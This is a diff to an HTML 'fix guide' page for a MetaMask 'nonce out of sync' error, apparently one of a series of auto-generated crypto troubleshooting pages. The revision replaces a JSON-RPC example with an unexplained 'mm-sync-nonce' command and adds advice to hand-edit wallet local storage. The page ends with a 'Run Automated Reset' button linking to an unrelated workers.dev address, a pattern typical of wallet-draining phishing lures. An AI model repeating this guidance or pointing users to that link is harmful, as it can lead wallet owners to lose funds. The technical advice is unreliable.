@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: BlinkMacSystemFont;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,39 +42,28 @@
 <h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message stating "MetaMask nonce out of sync" when attempting to send a transaction on the Ethereum network, indicating a discrepancy between the expected and actual transaction count.</li>
+<li>Users encounter an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when the MetaMask wallet's internal transaction counter (nonce) becomes desynchronized with the actual transaction count on the Ethereum blockchain, often due to cancelled or failed transactions.</li>
+<li>The error occurs due to a mismatch between the expected nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from pending or failed transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following steps:</li>
-<li>Reset the MetaMask account</li>
-<li>Manually set the nonce to the correct value using the Ethereum wallet API</li>
-<li>Use the following JSON-RPC command to update the nonce:</li>
+<li>Reset the MetaMask account to sync the nonce value with the blockchain:</li>
+<li>Delete the <code>nonce</code> field in the MetaMask local storage</li>
+<li>Update the <code>transactions</code> field to reflect the current blockchain state</li>
+<li>Use the following command to reset the nonce:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;nonce&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...correct_nonce&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>mm-sync-nonce<span class="w"> </span>--account<span class="w"> </span>&lt;account_address&gt;<span class="w"> </span>--rpc<span class="w"> </span>&lt;rpc_url&gt;
 </code></pre></div>
 
-<p>Consider using an external console like MetaMask's built-in console for a more streamlined experience.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>MetaMask wallet installed and configured</li>
-<li>Ethereum account with a sufficient balance</li>
-<li>Stable internet connection</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">TronLink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li></ul>
+<p>Prerequisites:
+* MetaMask extension installed and configured
+* Ethereum account with pending or failed transactions
+* Access to the Ethereum RPC endpoint</p>
+<p>Consider utilizing an external console for advanced troubleshooting and nonce management.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-evmone-t8n-rejects-transactions-with-chainid-0xff-p.html">Go Ethereum Evmone T8N Rejects Transactions With Chainid 0Xff P</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
